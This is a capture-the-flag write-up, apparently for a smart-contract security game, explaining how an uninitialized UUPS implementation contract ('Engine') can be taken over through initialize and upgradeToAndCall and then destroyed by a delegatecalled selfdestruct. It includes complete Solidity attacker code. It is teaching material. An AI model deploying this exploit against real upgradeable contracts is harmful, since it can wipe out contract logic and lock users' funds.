## Goal

The goal of this challenge is to ```selfdestruc``` the ```Engine``` contract.

## Exploit

In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.

Again the contracts of this challenge are following the Proxy Upgrade Pattern, more specifically the UUPS pattern. The proxy contract in our case ```Motorbike``` acts as a storage layer so any state modification in the implementation contract (in our case ```Engin```) normally doesn't produce side effects to systems using it, since only the logic is used through delegatecalls.

But the issue here is that the implementation contract ```Engine``` was left uninitialized, which means everyone can call the ```initialize``` function inside it and set ```upgrader``` and ```horsePower``` variables to the desired values.

After the ```upgrader``` variable is set to hold the value of the ```Attacker``` contract address, we can call ```upgradeToAndCall``` function insde ```Engine``` and it will ```delegatecall``` to the ```Attacker``` contract calling the ```selfdestruct``` function inside it. Altthough the ```selfdestruct``` will be called inside ```Attacker```, since we are delegating the call from the ```Engine``` contract it is the ```Engine``` contract that will be deleted.

To exploit the contract we need to:

1. create IEngine interface and define all the functions that we are going to use from ```Engine```
2. create Attacker contract
3. create attack(IEngine engine) external function inside the Attacker contract, passing in the Engine contract as function argument, and inside this function we will:
  <ul>
  <li>call initilize function from Engine in order to set the upgrader variable to the address of the Attacker contract</li>
  <li>call upgradeToAndCall function with the address of the Attacker contract as argument for newImplementation parameter and the abi encoded string of the kill function (inside which we'll call selfdestruct) as an argument for the data parameter</li>
  </ul>
3. create kill() function inside Attacker contract, and inside it call selfdestruct, because Engine contract will delegatecall to the Attacker contract calling this kill function, selfdestruct will cause the Engine contract to be deleted instead of the Attacker one.

## Attacker contract code

```
interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract Attacker {
    function attack(IEngine engine) external {
        engine.initialize();
        engine.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() public {
        selfdestruct(payable(address(this)));
    }
}
```
